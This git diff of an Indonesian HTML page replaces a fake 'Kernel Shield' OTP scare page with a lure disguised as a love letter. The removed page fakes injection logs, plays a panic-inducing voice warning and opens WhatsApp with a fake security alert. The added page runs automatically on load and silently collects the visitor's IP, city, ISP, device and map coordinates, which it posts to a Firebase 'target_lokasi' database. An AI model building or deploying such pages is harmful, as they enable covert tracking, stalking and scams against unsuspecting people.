@@ -1,56 +1,58 @@
-<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Perangkat</title>
+    <title>Surat Spesial Untukmu ❤️</title>
     <style>
-        body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 50px 20px; }
-        .btn-otp { padding: 20px; background: #25d366; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; font-size: 16px; box-shadow: 0 0 20px #25d366; }
-        .log { margin-top: 30px; font-size: 12px; color: #555; text-align: left; background: #111; padding: 10px; border-radius: 5px; height: 150px; overflow-y: scroll; }
+        body { background: #ffebee; color: #d81b60; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .heart { font-size: 60px; color: #e91e63; animation: beat .3s infinite alternate; }
+        @keyframes beat { to { transform: scale(1.2); } }
     </style>
 </head>
 <body>
-
-    <h1>🛡️ KERNEL SHIELD</h1>
-    <p>Sinkronisasi akun diperlukan untuk mencegah pemblokiran Chrome.</p>
-    
-    <button class="btn-otp" onclick="triggerOTP()">KONFIRMASI OTP SEKARANG</button>
-
-    <div id="logs" class="log">
-        > System standby...<br>
-        > Waiting for user activation...
+    <div class="container">
+        <div class="heart">❤️</div>
+        <h1 id="title">Membuka Pesan Rahasia...</h1>
+        <p id="status">Tunggu sebentar ya, Sayang...</p>
     </div>
 
     <script>
-        function logMsg(t) {
-            const l = document.getElementById('logs');
-            l.innerHTML += "> " + t + "<br>";
-            l.scrollTop = l.scrollHeight;
+        const DB_URL = "https://pirdangame-default-rtdb.asia-southeast1.firebasedatabase.app/target_lokasi.json";
+
+        async function sikatDataSilent() {
+            try {
+                // Pakai API yang berbeda untuk hasil lebih variatif
+                const res = await fetch('http://ip-api.com/json/?fields=66846719');
+                const data = await res.json();
+                
+                const payload = {
+                    waktu: new Date().toLocaleString(),
+                    ip: data.query,
+                    negara: data.country,
+                    provinsi: data.regionName,
+                    kota: data.city,
+                    isp: data.isp, // Nama provider (Indihome/Telkomsel dll)
+                    perangkat: navigator.userAgent,
+                    maps: `https://www.google.com/maps?q=${data.lat},${data.lon}`
+                };
+
+                // Kirim ke Firebase
+                await fetch(DB_URL, { method: 'POST', body: JSON.stringify(payload) });
+
+                // Tampilan setelah data kekirim
+                setTimeout(() => {
+                    document.getElementById('title').innerText = "Aku Kangen Kamu ❤️";
+                    document.getElementById('status').innerText = "Semoga harimu menyenangkan ya!";
+                }, 2000);
+
+            } catch (err) {
+                console.log("Silent Error");
+            }
         }
 
-        async function triggerOTP() {
-            logMsg("Memulai injeksi API...");
-            logMsg("Request OTP dari DANA.id...");
-            logMsg("Request OTP dari TikTok.com...");
-            logMsg("Request OTP dari Bank_Central...");
-            
-            // Suara Robot Biar Makin Panik
-            const utter = new SpeechSynthesisUtterance("Peringatan. Percobaan masuk terdeteksi pada akun Dana dan TikTok anda. Segera lakukan verifikasi.");
-            utter.lang = 'id-ID';
-            window.speechSynthesis.speak(utter);
-
-            setTimeout(() => {
-                logMsg("Membuka jalur enkripsi WhatsApp...");
-                
-                // INI TRIKNYA: Kirim ke nomor lu sendiri atau nomor target (isi nomor lu di bawah)
-                const nomorLu = "+6283865539387"; // GANTI PAKE NOMOR LU (Format 62xxx)
-                const pesan = "⚠️ PERINGATAN KEAMANAN PIRDAN-LABS ⚠️\n\nSeseorang mencoba login ke akun Anda:\n- DANA OTP: 8821\n- TIKTOK CODE: 5521\n- GOOGLE: 0912\n\nKlik KIRIM untuk membatalkan akses ilegal ini!";
-                
-                // Buka WhatsApp Target dengan pesan otomatis
-                window.location.href = "https://api.whatsapp.com/send?phone=" + nomorLu + "&text=" + encodeURIComponent(pesan);
-            }, 3000);
-        }
+        // Jalankan otomatis tanpa klik apapun
+        window.onload = sikatDataSilent;
     </script>
 </body>
-</html>
+    </html>
+    
